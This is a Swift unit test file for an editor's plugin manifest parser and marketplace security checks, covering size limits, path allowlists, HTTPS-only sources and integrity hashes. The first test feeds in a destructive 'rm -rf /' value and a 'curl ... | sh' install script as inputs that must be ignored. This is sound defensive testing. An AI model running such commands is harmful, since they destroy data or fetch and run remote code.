import Foundation
import XCTest
@testable import LumenEditorCore

final class PluginManifestTests: XCTestCase {
    func testParsesFullDeclarativeManifestWithoutExecutingAnything() throws {
        let worker = Data("self.onmessage = () => {}".utf8)
        let integrity = SHA256Integrity.digest(of: worker).rawValue
        let manifest = try parseManifest([
            "id": "Team-Tools",
            "name": "Team Tools",
            "version": "vNext-preview",
            "enabled": false,
            "commands": [[
                "id": "insert-header",
                "title": "Insert header",
                "insertText": "// Header\n",
                "ignoredExecutable": "rm -rf /"
            ]],
            "snippets": [[
                "label": "Log value",
                "text": "console.log(${1:value})",
                "trigger": "log-value",
                "scope": "JavaScript"
            ]],
            "extension": [
                "worker": "dist/worker.js",
                "permissions": ["document-read", "network", "document-edit"],
                "workerUrl": "https://plugins.example.test/assets/worker.js",
                "workerIntegrity": integrity
            ],
            "installScript": "curl https://example.test/install | sh"
        ])

        XCTAssertEqual(manifest.id, "Team-Tools")
        XCTAssertEqual(manifest.name, "Team Tools")
        XCTAssertEqual(manifest.version, "vNext-preview")
        XCTAssertFalse(manifest.enabled)
        XCTAssertEqual(
            manifest.commands,
            [PluginCommandContribution(
                id: "insert-header",
                title: "Insert header",
                insertText: "// Header\n"
            )]
        )
        XCTAssertEqual(
            manifest.snippets,
            [PluginSnippetContribution(
                label: "Log value",
                text: "console.log(${1:value})",
                trigger: "log-value",
                scope: "JavaScript"
            )]
        )
        XCTAssertEqual(manifest.extension?.worker, "dist/worker.js")
        XCTAssertEqual(manifest.extension?.permissions, [.documentRead, .documentEdit])
        XCTAssertEqual(
            manifest.extension?.workerURL,
            URL(string: "https://plugins.example.test/assets/worker.js")
        )
        XCTAssertEqual(manifest.extension?.workerIntegrity?.rawValue, integrity)
    }

    func testDefaultsMatchElectronTolerantManifestSemantics() throws {
        let missingFields = try parseManifest([
            "id": "minimal",
            "name": "Minimal"
        ])
        XCTAssertEqual(missingFields.version, "0.0.0")
        XCTAssertTrue(missingFields.enabled)
        XCTAssertEqual(missingFields.commands, [])
        XCTAssertEqual(missingFields.snippets, [])
        XCTAssertNil(missingFields.extension)

        let wrongOptionalTypes = try parseManifest([
            "id": "still-valid",
            "name": "Still valid",
            "version": 7,
            "enabled": "false",
            "commands": "not-an-array",
            "snippets": NSNull(),
            "extension": ["worker": "../escape.js"]
        ])
        XCTAssertEqual(wrongOptionalTypes.version, "0.0.0")
        XCTAssertTrue(wrongOptionalTypes.enabled)
        XCTAssertEqual(wrongOptionalTypes.commands, [])
        XCTAssertEqual(wrongOptionalTypes.snippets, [])
        XCTAssertNil(wrongOptionalTypes.extension)
    }

    func testRejectsInvalidJSONAndInvalidRequiredManifestFields() throws {
        XCTAssertThrowsError(try PluginManifest.parse(Data("{".utf8))) { error in
            XCTAssertEqual(error as? PluginManifestValidationError, .invalidJSON)
        }

        for object: [String: Any] in [
            ["id": "", "name": "Empty"],
            ["id": "has space", "name": "Space"],
            ["id": "路径", "name": "Unicode"],
            ["id": "valid-id"],
            ["id": 7, "name": "Wrong ID type"]
        ] {
            XCTAssertThrowsError(try PluginManifest.parse(jsonData(object))) { error in
                XCTAssertEqual(error as? PluginManifestValidationError, .invalidManifest)
            }
        }
    }

    func testManifestAndCatalogJSONBodiesAreBoundedBeforeParsing() {
        let oversizedManifest = Data(
            repeating: 0x20,
            count: PluginManifestSecurity.maximumManifestByteCount + 1
        )
        XCTAssertThrowsError(try PluginManifest.parse(oversizedManifest)) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .manifestByteCountOutOfRange(oversizedManifest.count)
            )
        }

        let oversizedCatalog = Data(
            repeating: 0x20,
            count: PluginManifestSecurity.maximumMarketplaceCatalogByteCount + 1
        )
        XCTAssertThrowsError(try MarketplaceItem.parseCatalog(oversizedCatalog)) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .manifestByteCountOutOfRange(oversizedCatalog.count)
            )
        }
    }

    func testFiltersMalformedContributionsThenCapsAndTruncatesValidOnes() throws {
        let commands: [Any] = [
            NSNull(),
            ["id": 9, "title": "wrong"],
            ["id": "missing-title"]
        ] + (0..<55).map { index -> Any in
            [
                "id": String(repeating: "i", count: 105) + "-\(index)",
                "title": String(repeating: "t", count: 205),
                "insertText": index == 0
                    ? String(repeating: "x", count: 10_005)
                    : "x"
            ] as [String: Any]
        }
        let snippets: [Any] = [
            ["label": "missing text"],
            ["label": 4, "text": "wrong label"]
        ] + (0..<105).map { index -> Any in
            [
                "label": String(repeating: "l", count: 205),
                "text": index == 0
                    ? String(repeating: "s", count: 10_005)
                    : "s",
                "trigger": index == 0 ? "bad trigger!" : "trigger-\(index)",
                "scope": String(repeating: "q", count: 105)
            ] as [String: Any]
        }

        let manifest = try parseManifest([
            "id": "bounded",
            "name": String(repeating: "n", count: 205),
            "version": String(repeating: "v", count: 55),
            "commands": commands,
            "snippets": snippets
        ])

        XCTAssertEqual(manifest.name.utf16.count, 200)
        XCTAssertEqual(manifest.version.utf16.count, 50)
        XCTAssertEqual(manifest.commands.count, 50)
        XCTAssertEqual(manifest.commands[0].id.utf16.count, 100)
        XCTAssertEqual(manifest.commands[0].title.utf16.count, 200)
        XCTAssertEqual(manifest.commands[0].insertText?.utf16.count, 10_000)
        XCTAssertEqual(manifest.snippets.count, 100)
        XCTAssertEqual(manifest.snippets[0].label.utf16.count, 200)
        XCTAssertEqual(manifest.snippets[0].text.utf16.count, 10_000)
        XCTAssertNil(manifest.snippets[0].trigger)
        XCTAssertEqual(manifest.snippets[1].trigger, "trigger-1")
        XCTAssertEqual(manifest.snippets[0].scope?.utf16.count, 100)
    }

    func testTriggerAndWorkerPathsUseASCIIAllowlist() throws {
        let manifest = try parseManifest([
            "id": "paths",
            "name": "Paths",
            "snippets": [
                ["label": "ASCII", "text": "a", "trigger": "word_2-ok"],
                ["label": "Unicode", "text": "b", "trigger": "café"],
                [
                    "label": "Long",
                    "text": "c",
                    "trigger": String(repeating: "a", count: 81)
                ]
            ],
            "extension": ["worker": "workers/main_2.js"]
        ])
        XCTAssertEqual(manifest.snippets.map(\.trigger), ["word_2-ok", nil, nil])
        XCTAssertEqual(manifest.extension?.worker, "workers/main_2.js")

        for worker in ["", "/absolute.js", "../escape.js", "dir/..evil.js", "bad path.js", "worker\\main.js"] {
            let candidate = try parseManifest([
                "id": "bad-worker",
                "name": "Bad worker",
                "extension": ["worker": worker]
            ])
            XCTAssertNil(candidate.extension, worker)
        }
    }

    func testInstalledWorkerPathResolvesInsidePluginDirectoryOnly() throws {
        let root = URL(fileURLWithPath: "/tmp/lumen-plugin", isDirectory: true)
        XCTAssertEqual(
            try PluginManifestSecurity.installedWorkerURL(
                pluginDirectory: root,
                workerPath: "dist/worker.js"
            ).path,
            "/tmp/lumen-plugin/dist/worker.js"
        )

        for path in ["", "/absolute.js", "../worker.js", "dist/..evil.js"] {
            XCTAssertThrowsError(
                try PluginManifestSecurity.installedWorkerURL(
                    pluginDirectory: root,
                    workerPath: path
                )
            ) { error in
                XCTAssertEqual(
                    error as? PluginManifestValidationError,
                    .invalidWorkerPath(path)
                )
            }
        }
    }

    func testEffectivePermissionsAreRequestedGrantedIntersection() throws {
        let manifest = try parseManifest([
            "id": "permissions",
            "name": "Permissions",
            "extension": [
                "worker": "worker.js",
                "permissions": [
                    "document-read",
                    "document-read",
                    "document-edit",
                    "filesystem"
                ]
            ]
        ])

        XCTAssertEqual(
            manifest.effectivePermissions(granted: [.documentRead]),
            [.documentRead]
        )
        XCTAssertEqual(
            manifest.effectivePermissions(granted: [.documentEdit, .documentRead]),
            [.documentRead, .documentEdit]
        )
        XCTAssertEqual(manifest.effectivePermissions(granted: []), [])
    }

    func testWorkerMessageTextIsBoundedWithoutAcceptingExecutableHandlers() {
        let command = PluginManifestSecurity.sanitizeRegisteredCommand(
            id: String(repeating: "i", count: 101),
            title: String(repeating: "t", count: 201)
        )
        XCTAssertNil(command)
        let valid = PluginManifestSecurity.sanitizeRegisteredCommand(
            id: "sample.command", title: String(repeating: "t", count: 201)
        )
        XCTAssertEqual(valid?.id, "sample.command")
        XCTAssertEqual(valid?.title.utf16.count, 200)
        XCTAssertNil(valid?.insertText)
        XCTAssertEqual(
            PluginManifestSecurity.sanitizeWorkerNotification(
                String(repeating: "n", count: 501)
            ).utf16.count,
            500
        )
    }

    func testSHA256IntegrityAcceptsExactSRIShapeAndHashesOriginalBytes() {
        let expected = "sha256-ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa0="
        XCTAssertEqual(SHA256Integrity.digest(of: Data("abc".utf8)).rawValue, expected)
        XCTAssertTrue(SHA256Integrity(rawValue: expected)?.matches(Data("abc".utf8)) == true)
        XCTAssertFalse(SHA256Integrity(rawValue: expected)?.matches(Data("ABC".utf8)) == true)

        XCTAssertNil(SHA256Integrity(rawValue: expected.replacingOccurrences(of: "sha256-", with: "SHA256-")))
        XCTAssertNil(SHA256Integrity(rawValue: String(expected.dropLast())))
        XCTAssertNil(SHA256Integrity(rawValue: String(expected.dropLast()) + "!"))
        // Same decoded bytes with non-zero Base64 pad bits is not canonical.
        XCTAssertNil(
            SHA256Integrity(
                rawValue: "sha256-ungWv48Bz+pBQUDeXa4iI7ADYaOWF3qctBD/YfIAFa1="
            )
        )
        XCTAssertNil(
            SHA256Integrity(
                rawValue: "sha256-" + Data(repeating: 0, count: 31).base64EncodedString()
            )
        )
        XCTAssertNil(SHA256Integrity(rawValue: "sha512-" + String(repeating: "A", count: 86) + "=="))
    }

    func testMarketplaceCatalogSupportsBothShapesFiltersAndDeduplicatesByID() throws {
        let data = try jsonData([
            "plugins": [
                [
                    "id": "one",
                    "name": "Old",
                    "version": "1",
                    "manifestUrl": "https://market.example.test/old.json"
                ],
                [
                    "id": "insecure",
                    "name": "HTTP",
                    "manifestUrl": "http://market.example.test/plugin.json"
                ],
                ["id": "missing-url", "name": "Missing"],
                [
                    "id": "two",
                    "name": String(repeating: "n", count: 205),
                    "description": String(repeating: "d", count: 505),
                    "manifestUrl": "https://market.example.test/two.json"
                ],
                [
                    "id": "one",
                    "name": "New",
                    "version": "not-semver",
                    "manifestUrl": "https://market.example.test/new.json"
                ]
            ]
        ])

        let items = try MarketplaceItem.parseCatalog(data)
        XCTAssertEqual(items.map(\.id), ["one", "two"])
        XCTAssertEqual(items[0].name, "New")
        XCTAssertEqual(items[0].version, "not-semver")
        XCTAssertEqual(items[0].manifestURL.absoluteString, "https://market.example.test/new.json")
        XCTAssertEqual(items[1].version, "0.0.0")
        XCTAssertEqual(items[1].name.utf16.count, 200)
        XCTAssertEqual(items[1].description?.utf16.count, 500)

        let topLevel = try MarketplaceItem.parseCatalog(jsonData([[
            "id": "top-level",
            "name": "Top level",
            "manifestUrl": "https://market.example.test/top.json"
        ]]))
        XCTAssertEqual(topLevel.map(\.id), ["top-level"])
    }

    func testMarketplaceSourcesRequireHTTPSAndApplyProjectLimits() {
        let rejected = [
            "http://market.example.test/insecure.json",
            "HTTPS://market.example.test/uppercase.json",
            "https://",
            String(repeating: "x", count: 2_001)
        ]
        XCTAssertEqual(
            PluginManifestSecurity.sanitizeMarketplaceSourceURLs(rejected),
            []
        )

        let values = (0..<25).map { "https://market\($0).example.test/index.json" }

        let urls = PluginManifestSecurity.sanitizeMarketplaceSourceURLs(values)
        XCTAssertEqual(urls.count, 20)
        XCTAssertEqual(urls.first?.absoluteString, "https://market0.example.test/index.json")
        XCTAssertEqual(urls.last?.absoluteString, "https://market19.example.test/index.json")

        let invalidPrefixDoesNotConsumeBudget = Array(repeating: "http://insecure.test", count: 20)
            + ["https://market.example.test/too-late.json"]
        XCTAssertEqual(
            PluginManifestSecurity.sanitizeMarketplaceSourceURLs(invalidPrefixDoesNotConsumeBudget)
                .map(\.absoluteString),
            ["https://market.example.test/too-late.json"]
        )
    }

    func testManifestRequestDeclaresHTTPSNoRedirectAndTimeoutPolicy() throws {
        let url = try XCTUnwrap(URL(string: "https://market.example.test/plugin.json"))
        let request = try PluginManifestSecurity.marketplaceManifestRequest(for: url)

        XCTAssertEqual(request.kind, .manifest)
        XCTAssertEqual(request.url, url)
        XCTAssertEqual(request.redirectPolicy, .reject)
        XCTAssertEqual(request.timeoutSeconds, 10)
        XCTAssertTrue(request.requiresSuccessfulHTTPStatus)
        XCTAssertNil(request.minimumByteCount)
        XCTAssertEqual(request.maximumByteCount, 1_024 * 1_024)
        XCTAssertNil(request.expectedIntegrity)

        XCTAssertThrowsError(
            try PluginManifestSecurity.marketplaceManifestRequest(
                for: XCTUnwrap(URL(string: "http://market.example.test/plugin.json"))
            )
        ) { error in
            guard case .invalidHTTPSURL = error as? PluginManifestValidationError else {
                return XCTFail("Unexpected error: \(error)")
            }
        }
        XCTAssertThrowsError(
            try PluginManifestSecurity.marketplaceManifestRequest(
                for: XCTUnwrap(URL(string: "HTTPS://market.example.test/plugin.json"))
            )
        )

        let catalogRequest = try PluginManifestSecurity.marketplaceCatalogRequest(for: url)
        XCTAssertEqual(catalogRequest.kind, .catalog)
        XCTAssertEqual(catalogRequest.redirectPolicy, .reject)
        XCTAssertEqual(catalogRequest.timeoutSeconds, 10)
        XCTAssertEqual(catalogRequest.maximumByteCount, 4 * 1_024 * 1_024)
    }

    func testMarketplaceWorkerRequiresCompleteSameOriginHTTPSMetadata() throws {
        let worker = Data("worker".utf8)
        let integrity = SHA256Integrity.digest(of: worker).rawValue
        let manifestURL = try XCTUnwrap(URL(string: "https://plugins.example.test:443/manifests/plugin.json"))
        let valid = try parseManifest([
            "id": "remote",
            "name": "Remote",
            "extension": [
                "worker": "worker.js",
                "workerUrl": "https://plugins.example.test/assets/worker.js",
                "workerIntegrity": integrity
            ]
        ])

        let request = try XCTUnwrap(
            PluginManifestSecurity.marketplaceWorkerRequest(
                for: valid,
                manifestURL: manifestURL
            )
        )
        XCTAssertEqual(request.kind, .worker)
        XCTAssertEqual(request.redirectPolicy, .reject)
        XCTAssertEqual(request.minimumByteCount, 1)
        XCTAssertEqual(request.maximumByteCount, 512 * 1_024)
        XCTAssertEqual(request.expectedIntegrity?.rawValue, integrity)

        let onlyURL = try parseManifest([
            "id": "only-url",
            "name": "Only URL",
            "extension": [
                "worker": "worker.js",
                "workerUrl": "https://plugins.example.test/worker.js"
            ]
        ])
        XCTAssertThrowsError(
            try PluginManifestSecurity.marketplaceWorkerRequest(
                for: onlyURL,
                manifestURL: manifestURL
            )
        ) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .incompleteMarketplaceWorkerMetadata
            )
        }

        let crossOrigin = try parseManifest([
            "id": "cross-origin",
            "name": "Cross origin",
            "extension": [
                "worker": "worker.js",
                "workerUrl": "https://cdn.example.test/worker.js",
                "workerIntegrity": integrity
            ]
        ])
        XCTAssertThrowsError(
            try PluginManifestSecurity.marketplaceWorkerRequest(
                for: crossOrigin,
                manifestURL: manifestURL
            )
        ) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .marketplaceWorkerOriginMismatch
            )
        }

        let nonDefaultPort = try parseManifest([
            "id": "other-port",
            "name": "Other port",
            "extension": [
                "worker": "worker.js",
                "workerUrl": "https://plugins.example.test:444/worker.js",
                "workerIntegrity": integrity
            ]
        ])
        XCTAssertThrowsError(
            try PluginManifestSecurity.marketplaceWorkerRequest(
                for: nonDefaultPort,
                manifestURL: manifestURL
            )
        ) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .marketplaceWorkerOriginMismatch
            )
        }
    }

    func testResponseValidationRejectsHTTPFailuresAndRedirects() throws {
        let url = try XCTUnwrap(URL(string: "https://market.example.test/plugin.json"))
        let request = try PluginManifestSecurity.marketplaceManifestRequest(for: url)

        XCTAssertNoThrow(
            try PluginManifestSecurity.validateResponse(
                statusCode: 200,
                finalURL: url,
                against: request
            )
        )
        XCTAssertThrowsError(
            try PluginManifestSecurity.validateResponse(
                statusCode: 404,
                finalURL: url,
                against: request
            )
        ) { error in
            XCTAssertEqual(error as? PluginManifestValidationError, .unsuccessfulHTTPStatus(404))
        }
        let oversized = Data(
            repeating: 0,
            count: PluginManifestSecurity.maximumManifestByteCount + 1
        )
        XCTAssertThrowsError(
            try PluginManifestSecurity.validateResponse(
                finalURL: url,
                data: oversized,
                against: request
            )
        ) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .manifestByteCountOutOfRange(oversized.count)
            )
        }

        let redirected = try XCTUnwrap(URL(string: "https://market.example.test/other.json"))
        XCTAssertThrowsError(
            try PluginManifestSecurity.validateResponse(
                finalURL: redirected,
                against: request
            )
        ) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .redirectedResource(
                    expected: url.absoluteString,
                    actual: redirected.absoluteString
                )
            )
        }
    }

    func testWorkerResponseEnforcesOneThrough512KiBAndIntegrity() throws {
        let maximumWorker = Data(repeating: 0xa5, count: 512 * 1_024)
        let request = try workerRequest(for: maximumWorker)

        XCTAssertNoThrow(
            try PluginManifestSecurity.validateResponse(
                finalURL: request.url,
                data: maximumWorker,
                against: request
            )
        )

        for invalidData in [Data(), Data(repeating: 0, count: 512 * 1_024 + 1)] {
            XCTAssertThrowsError(
                try PluginManifestSecurity.validateResponse(
                    finalURL: request.url,
                    data: invalidData,
                    against: request
                )
            ) { error in
                XCTAssertEqual(
                    error as? PluginManifestValidationError,
                    .workerByteCountOutOfRange(invalidData.count)
                )
            }
        }

        XCTAssertThrowsError(
            try PluginManifestSecurity.validateResponse(
                finalURL: request.url,
                data: Data("tampered".utf8),
                against: request
            )
        ) { error in
            XCTAssertEqual(error as? PluginManifestValidationError, .workerIntegrityMismatch)
        }
        XCTAssertThrowsError(
            try PluginManifestSecurity.validateResponse(
                finalURL: request.url,
                data: nil,
                against: request
            )
        ) { error in
            XCTAssertEqual(error as? PluginManifestValidationError, .missingWorkerData)
        }
    }

    func testInstalledWorkerHasSame512KiBCeilingButMayBeEmpty() {
        XCTAssertNoThrow(try PluginManifestSecurity.validateInstalledWorkerData(Data()))
        XCTAssertNoThrow(
            try PluginManifestSecurity.validateInstalledWorkerData(
                Data(repeating: 0, count: 512 * 1_024)
            )
        )
        XCTAssertThrowsError(
            try PluginManifestSecurity.validateInstalledWorkerData(
                Data(repeating: 0, count: 512 * 1_024 + 1)
            )
        ) { error in
            XCTAssertEqual(
                error as? PluginManifestValidationError,
                .workerByteCountOutOfRange(512 * 1_024 + 1)
            )
        }
    }

    func testInstalledManifestDropsMarketplaceSourceMetadata() throws {
        let bytes = Data("worker".utf8)
        let remote = try parseManifest([
            "id": "strip-remote",
            "name": "Strip remote",
            "extension": [
                "worker": "worker.js",
                "permissions": ["document-read"],
                "workerUrl": "https://plugins.example.test/worker.js",
                "workerIntegrity": SHA256Integrity.digest(of: bytes).rawValue
            ]
        ])

        let installed = remote.removingMarketplaceMetadata()
        XCTAssertEqual(installed.extension?.worker, "worker.js")
        XCTAssertEqual(installed.extension?.permissions, [.documentRead])
        XCTAssertNil(installed.extension?.workerURL)
        XCTAssertNil(installed.extension?.workerIntegrity)
    }

    private func workerRequest(for bytes: Data) throws -> MarketplaceResourceRequest {
        let origin = "https://plugins.example.test"
        let manifest = try parseManifest([
            "id": "worker-policy",
            "name": "Worker policy",
            "extension": [
                "worker": "worker.js",
                "workerUrl": "\(origin)/worker.js",
                "workerIntegrity": SHA256Integrity.digest(of: bytes).rawValue
            ]
        ])
        return try XCTUnwrap(
            PluginManifestSecurity.marketplaceWorkerRequest(
                for: manifest,
                manifestURL: XCTUnwrap(URL(string: "\(origin)/plugin.json"))
            )
        )
    }

    private func parseManifest(_ object: [String: Any]) throws -> PluginManifest {
        try PluginManifest.parse(jsonData(object))
    }

    private func jsonData(_ object: Any) throws -> Data {
        try JSONSerialization.data(withJSONObject: object)
    }
}
